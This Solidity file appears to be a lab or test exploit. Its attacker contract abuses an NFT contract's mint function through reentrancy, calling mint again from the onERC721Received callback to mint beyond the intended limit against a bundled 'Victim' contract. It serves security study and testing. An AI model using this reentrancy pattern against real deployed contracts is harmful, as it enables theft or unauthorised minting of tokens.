// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./Victim.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract NFTContractAttack is IERC721Receiver, DSTest {
    uint256 numberOfNfts;
    NFTContract nftContract;

    constructor(address _nftAddress) {
        nftContract = NFTContract(_nftAddress);
    }

    function Attack(uint256 _numberOfNfts) public {
        numberOfNfts = _numberOfNfts;
        nftContract.mint(_numberOfNfts);
    }

    function onERC721Received(address, address, uint256, bytes memory) public override returns (bytes4) {
        if (numberOfNfts >= 2) {
            numberOfNfts = numberOfNfts - 1;
            nftContract.mint(numberOfNfts);
        }
        return this.onERC721Received.selector;
    }
}
